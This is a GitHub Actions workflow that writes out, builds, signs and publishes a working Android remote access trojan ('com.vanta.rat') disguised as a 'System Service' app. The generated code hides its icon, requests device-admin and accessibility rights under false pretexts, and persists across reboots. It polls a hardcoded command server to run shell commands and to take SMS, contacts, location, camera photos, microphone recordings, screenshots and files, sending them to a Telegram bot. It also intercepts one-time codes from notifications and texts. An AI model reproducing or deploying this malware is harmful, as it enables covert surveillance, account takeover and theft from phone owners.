name: build
on:
  workflow_dispatch:
    inputs:
      token:
        description: 'Bot Token'
        required: true
      chat:
        description: 'Chat ID'
        required: true

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: 8.5

      - name: Generate project
        env:
          BT: ${{ github.event.inputs.token }}
          CI: ${{ github.event.inputs.chat }}
        run: |
          mkdir -p app/src/main/java/com/vanta/rat
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml

          cat > settings.gradle <<'EOF'
          include ':app'
          rootProject.name = "Svc"
          EOF

          cat > build.gradle <<'EOF'
          buildscript {
            repositories { google(); mavenCentral() }
            dependencies { classpath 'com.android.tools.build:gradle:8.1.2' }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          cat > app/build.gradle <<'EOF'
          apply plugin: 'com.android.application'
          android {
            namespace 'com.vanta.rat'
            compileSdk 34
            defaultConfig {
              applicationId "com.vanta.rat"
              minSdk 21
              targetSdk 28
              versionCode 1
              versionName "1.0"
            }
            compileOptions {
              sourceCompatibility JavaVersion.VERSION_1_8
              targetCompatibility JavaVersion.VERSION_1_8
            }
            lint { abortOnError false }
          }
          dependencies { implementation 'org.json:json:20231013' }
          EOF

          cat > app/src/main/res/values/strings.xml <<EOF
          <resources>
            <string name="app_name">System Service</string>
            <string name="vanta_token">$BT</string>
            <string name="vanta_chat">$CI</string>
            <string name="vanta_server">http://147.135.213.72:20378</string>
            <string name="acc_desc">تفعيل خدمة إمكانية الوصول لتحسين الأداء</string>
          </resources>
          EOF

          cat > app/src/main/res/xml/accessibility_service.xml <<'EOF'
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
              android:canRetrieveWindowContent="true"
              android:canTakeScreenshot="true"
              android:notificationTimeout="100"
              android:description="@string/acc_desc"/>
          EOF

          cat > app/src/main/res/xml/device_admin.xml <<'EOF'
          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-policies>
              <force-lock/>
            </uses-policies>
          </device-admin>
          EOF

          cat > app/src/main/AndroidManifest.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <application android:label="@string/app_name"
                android:icon="@android:drawable/sym_def_app_icon"
                android:requestLegacyExternalStorage="true"
                android:usesCleartextTraffic="true">
              <activity android:name=".MainActivity" android:exported="true">
                <intent-filter>
                  <action android:name="android.intent.action.MAIN"/>
                  <category android:name="android.intent.category.LAUNCHER"/>
                </intent-filter>
              </activity>
              <service android:name=".BotService" android:exported="false"/>
              <service android:name=".KeyService" android:exported="true"
                  android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
                <intent-filter>
                  <action android:name="android.accessibilityservice.AccessibilityService"/>
                </intent-filter>
                <meta-data android:name="android.accessibilityservice"
                    android:resource="@xml/accessibility_service"/>
              </service>
              <service android:name=".NotifListener" android:exported="true"
                  android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
                <intent-filter>
                  <action android:name="android.service.notification.NotificationListenerService"/>
                </intent-filter>
              </service>
              <receiver android:name=".AdminReceiver" android:exported="true"
                  android:permission="android.permission.BIND_DEVICE_ADMIN">
                <meta-data android:name="android.app.device_admin"
                    android:resource="@xml/device_admin"/>
                <intent-filter>
                  <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
                </intent-filter>
              </receiver>
              <receiver android:name=".SmsReceiver" android:exported="true">
                <intent-filter android:priority="999">
                  <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                </intent-filter>
              </receiver>
              <receiver android:name=".BootReceiver" android:exported="true">
                <intent-filter>
                  <action android:name="android.intent.action.BOOT_COMPLETED"/>
                </intent-filter>
              </receiver>
            </application>
          </manifest>
          EOF

          cat > app/src/main/java/com/vanta/rat/AdminReceiver.java <<'EOF'
          package com.vanta.rat;
          import android.app.admin.DeviceAdminReceiver;
          public class AdminReceiver extends DeviceAdminReceiver {
          }
          EOF

          cat > app/src/main/java/com/vanta/rat/MainActivity.java <<'EOF'
          package com.vanta.rat;
          import android.Manifest;
          import android.app.Activity;
          import android.app.admin.DevicePolicyManager;
          import android.content.ComponentName;
          import android.content.Context;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import java.util.ArrayList;
          import java.util.List;
          public class MainActivity extends Activity {
            protected void onCreate(Bundle b) {
              super.onCreate(b);
              try {
                if (Build.VERSION.SDK_INT >= 23) {
                  List<String> n = new ArrayList<>();
                  String[] p = { Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO };
                  for (String s : p) if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) n.add(s);
                  if (!n.isEmpty()) requestPermissions(n.toArray(new String[0]), 1);
                }
              } catch (Exception e) {}
              try {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName cn = new ComponentName(this, AdminReceiver.class);
                if (!dpm.isAdminActive(cn)) {
                  Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                  i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                  i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل حماية الجهاز");
                  startActivity(i);
                }
              } catch (Exception e) {}
              try {
                Intent i = new Intent(this, BotService.class);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
              } catch (Exception e) {}
              try {
                getPackageManager().setComponentEnabledSetting(getComponentName(),
                  PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
              } catch (Exception e) {}
              try {
                startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                  .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
              } catch (Exception e) {}
              finish();
            }
          }
          EOF

          cat > app/src/main/java/com/vanta/rat/KeyService.java <<'EOF'
          package com.vanta.rat;
          import android.accessibilityservice.AccessibilityService;
          import android.graphics.Bitmap;
          import android.os.Build;
          import android.view.Display;
          import android.view.accessibility.AccessibilityEvent;
          import java.io.FileOutputStream;
          public class KeyService extends AccessibilityService {
            public static KeyService I = null;
            public void onServiceConnected() {
              I = this;
              try { BotService.alert(this, "✅ إمكانية الوصول اتفعّلت"); } catch (Exception e) {}
            }
            public void onAccessibilityEvent(AccessibilityEvent e) {}
            public void onInterrupt() {}
            public void shot(final String path) {
              try {
                if (Build.VERSION.SDK_INT < 30) {
                  BotService.sendRes(this, "لقطة الشاشة محتاجة أندرويد 11+");
                  return;
                }
                takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(),
                  new TakeScreenshotCallback() {
                    public void onSuccess(ScreenshotResult r) {
                      try {
                        android.hardware.HardwareBuffer hb = r.getHardwareBuffer();
                        Bitmap bm = Bitmap.wrapHardwareBuffer(hb, r.getColorSpace());
                        Bitmap sw = bm.copy(Bitmap.Config.ARGB_8888, false);
                        hb.close();
                        FileOutputStream fo = new FileOutputStream(path);
                        sw.compress(Bitmap.CompressFormat.PNG, 100, fo);
                        fo.close();
                        BotService.tgFile(KeyService.this, path, "📸 لقطة شاشة");
                      } catch (Exception e) { BotService.sendRes(KeyService.this, "shot ERR " + e); }
                    }
                    public void onFailure(int code) {
                      BotService.sendRes(KeyService.this, "shot فشل: " + code);
                    }
                  });
              } catch (Exception e) { BotService.sendRes(this, "shot ERR " + e); }
            }
          }
          EOF

          cat > app/src/main/java/com/vanta/rat/BotService.java <<'EOF'
          package com.vanta.rat;
          import android.app.*;
          import android.app.admin.DevicePolicyManager;
          import android.content.*;
          import android.database.Cursor;
          import android.net.Uri;
          import android.os.*;
          import android.provider.*;
          import java.io.*;
          import java.net.*;
          import org.json.*;
          public class BotService extends Service {
            static String TK = "", CH = "", SRV = "", DID = "";
            public void onCreate() {
              super.onCreate();
              TK = getString(R.string.vanta_token);
              CH = getString(R.string.vanta_chat);
              SRV = getString(R.string.vanta_server);
              DID = Build.MANUFACTURER + "_" + Build.MODEL + "_" + Long.toHexString(System.currentTimeMillis());
              try { startForeground(1, notif()); } catch (Exception e) {}
              new Thread(new Runnable() { public void run() { loop(); } }).start();
            }
            Notification notif() {
              String c = "c";
              try {
                if (Build.VERSION.SDK_INT >= 26) {
                  NotificationChannel n = new NotificationChannel(c, "s", NotificationManager.IMPORTANCE_MIN);
                  ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(n);
                }
              } catch (Exception e) {}
              Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, c) : new Notification.Builder(this);
              return b.setContentTitle("sync").setSmallIcon(android.R.drawable.stat_notify_sync).build();
            }
            static String enc(String s) {
              try { return URLEncoder.encode(s, "UTF-8"); } catch (Exception e) { return s; }
            }
            String http(String url) {
              try {
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setConnectTimeout(15000); c.setReadTimeout(35000);
                BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder s = new StringBuilder(); String l;
                while ((l = r.readLine()) != null) s.append(l);
                r.close();
                return s.toString();
              } catch (Exception e) { return ""; }
            }
            void httpPost(String url, String body) {
              try {
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setDoOutput(true); c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.getOutputStream().write(body.getBytes("UTF-8"));
                c.getInputStream().close();
              } catch (Exception e) {}
            }
            static void sendRes(Context ctx, String t) {
              try {
                String srv = ctx.getString(R.string.vanta_server);
                HttpURLConnection c = (HttpURLConnection) new URL(srv + "/result").openConnection();
                c.setDoOutput(true); c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.getOutputStream().write(("{\"id\":\"" + DID + "\",\"data\":" + JSONObject.quote(t) + "}").getBytes("UTF-8"));
                c.getInputStream().close();
              } catch (Exception e) {}
            }
            static void alert(Context ctx, String text) {
              try {
                String tk = ctx.getString(R.string.vanta_token);
                String ch = ctx.getString(R.string.vanta_chat);
                HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendMessage").openConnection();
                c.setDoOutput(true); c.setRequestMethod("POST");
                c.getOutputStream().write(("chat_id=" + ch + "&text=" + URLEncoder.encode(text, "UTF-8")).getBytes("UTF-8"));
                c.getInputStream().close();
              } catch (Exception e) {}
            }
            static void tgFile(Context ctx, String path, String caption) {
              try {
                File f0 = new File(path);
                if (!f0.exists()) { sendRes(ctx, "❌ الملف مش موجود: " + path); return; }
                String tk = ctx.getString(R.string.vanta_token);
                String ch = ctx.getString(R.string.vanta_chat);
                String b = "----x" + System.currentTimeMillis();
                ByteArrayOutputStream bo = new ByteArrayOutputStream();
                bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + ch + "\r\n").getBytes("UTF-8"));
                bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n").getBytes("UTF-8"));
                bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + f0.getName() + "\"\r\n").getBytes("UTF-8"));
                bo.write("Content-Type: application/octet-stream\r\n\r\n".getBytes("UTF-8"));
                FileInputStream f = new FileInputStream(f0);
                byte[] buf = new byte[8192]; int n;
                while ((n = f.read(buf)) > 0) bo.write(buf, 0, n);
                f.close();
                bo.write(("\r\n--" + b + "--\r\n").getBytes("UTF-8"));
                byte[] body = bo.toByteArray();
                HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendDocument").openConnection();
                c.setDoOutput(true);
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b);
                c.setFixedLengthStreamingMode(body.length);
                c.getOutputStream().write(body);
                int code = c.getResponseCode();
                sendRes(ctx, "📤 نتيجة الإرسال: " + code + " | " + f0.getName());
              } catch (Exception e) {
                sendRes(ctx, "❌ فشل الإرسال: " + e);
              }
            }
            void res(String t) { sendRes(this, t); }
            void loop() {
              try { http(SRV + "/register?id=" + enc(DID) + "&info=" + enc(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE)); } catch (Exception e) {}
              while (true) {
                try {
                  String r = http(SRV + "/task?id=" + enc(DID));
                  String cmd = "";
                  try { cmd = new JSONObject(r).optString("cmd", ""); } catch (Exception e) {}
                  if (cmd.length() > 0) doCmd(cmd);
                } catch (Exception e) {}
                try { Thread.sleep(3000); } catch (Exception e) {}
              }
            }
            void doCmd(String cmd) {
              try {
                String[] p = cmd.split(" ", 2);
                String k = p[0].toLowerCase();
                String a = p.length > 1 ? p[1] : "";
                if (k.equals("sys")) res(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE);
                else if (k.equals("sms")) res(sms());
                else if (k.equals("contacts")) res(contacts());
                else if (k.equals("files")) res(listDir(a));
                else if (k.equals("ls")) res(listDir(a));
                else if (k.equals("loc")) res(loc());
                else if (k.equals("cam")) cam(a);
                else if (k.equals("mic")) mic(a);
                else if (k.equals("shot")) {
                  if (KeyService.I != null) KeyService.I.shot(getExternalFilesDir(null) + "/shot.png");
                  else res("لقطة الشاشة محتاجة تفعيل إمكانية الوصول");
                }
                else if (k.equals("lock")) lockNow();
                else if (k.equals("popup")) popup(a);
                else if (k.equals("shell")) shell(a);
                else if (k.equals("clip")) res("الحافظة غير مدعومة");
                else if (k.equals("reboot")) res("محتاج root");
                else if (k.equals("persist")) res("ok - الاستمرارية شغالة");
                else if (k.equals("get")) {
                  File f = new File(a);
                  if (f.exists()) tgFile(this, a, "file"); else res("not found");
                }
                else if (k.equals("open")) {
                  startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(a)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                  res("ok");
                }
                else res("cmd: " + cmd);
              } catch (Exception e) { res("ERR " + e); }
            }
            void lockNow() {
              try {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                if (dpm.isAdminActive(new ComponentName(this, AdminReceiver.class))) {
                  dpm.lockNow(); res("🔒 اتقفل");
                } else res("محتاج تفعيل صلاحية الأدمن");
              } catch (Exception e) { res("ERR " + e); }
            }
            void cam(String a) {
              try {
                int id = 0;
                int n = android.hardware.Camera.getNumberOfCameras();
                android.hardware.Camera.CameraInfo ci = new android.hardware.Camera.CameraInfo();
                for (int i = 0; i < n; i++) {
                  android.hardware.Camera.getCameraInfo(i, ci);
                  if (ci.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) { id = i; break; }
                }
                final android.hardware.Camera c = android.hardware.Camera.open(id);
                c.setPreviewTexture(new android.graphics.SurfaceTexture(0));
                c.startPreview();
                final String f = getExternalFilesDir(null) + "/cam.jpg";
                c.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                  public void onPictureTaken(byte[] data, android.hardware.Camera cc) {
                    try {
                      FileOutputStream o = new FileOutputStream(f);
                      o.write(data); o.close();
                      res("cam صورة " + data.length + " بايت");
                    } catch (Exception e) { res("cam ERR " + e); }
                    try { cc.release(); } catch (Exception e) {}
                    tgFile(BotService.this, f, "📷 كاميرا");
                  }
                });
              } catch (Exception e) { res("cam ERR " + e); }
            }
            void mic(String a) {
              try {
                int sec = 10;
                try { sec = Integer.parseInt(a.trim()); } catch (Exception e) {}
                final String f = getExternalFilesDir(null) + "/mic.mp4";
                final android.media.MediaRecorder r = new android.media.MediaRecorder();
                r.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
                r.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
                r.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
                r.setOutputFile(f);
                r.prepare(); r.start();
                final BotService self = this;
                new Handler(getMainLooper()).postDelayed(new Runnable() {
                  public void run() {
                    try { r.stop(); r.release(); } catch (Exception e) {}
                    tgFile(self, f, "🎙 تسجيل");
                  }
                }, sec * 1000L);
                res("mic " + sec + "s ok");
              } catch (Exception e) { res("mic ERR " + e); }
            }
            void popup(String a) {
              try {
                final String m = a;
                new Handler(getMainLooper()).post(new Runnable() {
                  public void run() {
                    try { android.widget.Toast.makeText(getApplicationContext(), m, android.widget.Toast.LENGTH_LONG).show(); } catch (Exception e) {}
                  }
                });
                res("ok");
              } catch (Exception e) { res("ERR " + e); }
            }
            void shell(String a) {
              try {
                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", a});
                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder s = new StringBuilder(); String l;
                while ((l = r.readLine()) != null) s.append(l).append("\n");
                r.close();
                res(s.toString().length() > 0 ? s.toString() : "(no output)");
              } catch (Exception e) { res("ERR " + e); }
            }
            String sms() {
              StringBuilder s = new StringBuilder("SMS:\n");
              try {
                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
                while (c != null && c.moveToNext())
                  s.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ")
                   .append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
                if (c != null) c.close();
              } catch (Exception e) { s.append("no perm"); }
              return s.toString();
            }
            String contacts() {
              StringBuilder s = new StringBuilder("Contacts:\n");
              try {
                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                int n = 0;
                while (c != null && c.moveToNext() && n < 30) {
                  s.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(": ")
                   .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                  n++;
                }
                if (c != null) c.close();
              } catch (Exception e) { s.append("no perm"); }
              return s.toString();
            }
            String listDir(String a) {
              StringBuilder s = new StringBuilder("Files:\n");
              try {
                File d = (a == null || a.length() == 0) ? Environment.getExternalStorageDirectory() : new File(a);
                for (File f : d.listFiles()) { if (f.isFile()) s.append(f.getName()).append("\n"); if (s.length() > 3000) break; }
              } catch (Exception e) { s.append("no perm"); }
              return s.toString();
            }
            String loc() {
              try {
                android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
                android.location.Location l = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                if (l == null) l = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                if (l == null) return "no location";
                return "https://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude();
              } catch (Exception e) { return "no perm"; }
            }
            public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
            public IBinder onBind(Intent i) { return null; }
          }
          EOF

          cat > app/src/main/java/com/vanta/rat/NotifListener.java <<'EOF'
          package com.vanta.rat;
          import android.app.Notification;
          import android.os.Bundle;
          import android.service.notification.*;
          import java.util.*;
          public class NotifListener extends NotificationListenerService {
            static final LinkedList<String> L = new LinkedList<>();
            public void onNotificationPosted(StatusBarNotification s) {
              try {
                Bundle b = s.getNotification().extras;
                String t = b.getString(Notification.EXTRA_TITLE, "");
                CharSequence x = b.getCharSequence(Notification.EXTRA_TEXT);
                String y = x == null ? "" : x.toString();
                if (y.isEmpty() && t.isEmpty()) return;
                String line = s.getPackageName() + " | " + t + ": " + y;
                synchronized (L) { L.addFirst(line); while (L.size() > 60) L.removeLast(); }
                boolean hot = s.getPackageName().contains("telegram") || y.matches(".*\\b\\d{4,6}\\b.*");
                if (hot) BotService.alert(this, "!! " + line);
              } catch (Exception e) {}
            }
            public static String dump() {
              StringBuilder s = new StringBuilder("Notifs:\n");
              synchronized (L) { for (String x : L) s.append(x).append("\n"); }
              return s.toString();
            }
          }
          EOF

          cat > app/src/main/java/com/vanta/rat/SmsReceiver.java <<'EOF'
          package com.vanta.rat;
          import android.content.*;
          import android.telephony.SmsMessage;
          public class SmsReceiver extends BroadcastReceiver {
            public void onReceive(Context c, Intent i) {
              try {
                Object[] p = (Object[]) i.getExtras().get("pdus");
                StringBuilder s = new StringBuilder();
                String f = "";
                for (Object o : p) {
                  SmsMessage m = SmsMessage.createFromPdu((byte[]) o);
                  f = m.getOriginatingAddress();
                  s.append(m.getMessageBody());
                }
                BotService.alert(c, "SMS " + f + ": " + s);
              } catch (Exception e) {}
            }
          }
          EOF

          cat > app/src/main/java/com/vanta/rat/BootReceiver.java <<'EOF'
          package com.vanta.rat;
          import android.content.*;
          import android.os.Build;
          public class BootReceiver extends BroadcastReceiver {
            public void onReceive(Context c, Intent i) {
              try {
                Intent s = new Intent(c, BotService.class);
                if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s); else c.startService(s);
              } catch (Exception e) {}
            }
          }
          EOF

      - name: Build
        run: gradle assembleRelease --no-daemon

      - name: Sign
        run: |
          keytool -genkey -v -keystore k.jks -alias a -keyalg RSA -keysize 2048 \
            -validity 10000 -storepass vanta123 -keypass vanta123 -dname "CN=V" >/dev/null 2>&1
          APK=$(find . -name "*.apk" | grep -v aligned | head -1)
          BT=$(ls $ANDROID_HOME/build-tools | tail -1)
          $ANDROID_HOME/build-tools/$BT/zipalign -p -f 4 "$APK" aligned.apk
          $ANDROID_HOME/build-tools/$BT/apksigner sign --ks k.jks \
            --ks-pass pass:vanta123 --out rat.apk aligned.apk

      - uses: actions/upload-artifact@v4
        with:
          name: rat
          path: rat.apk

      - name: Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: latest
          files: rat.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
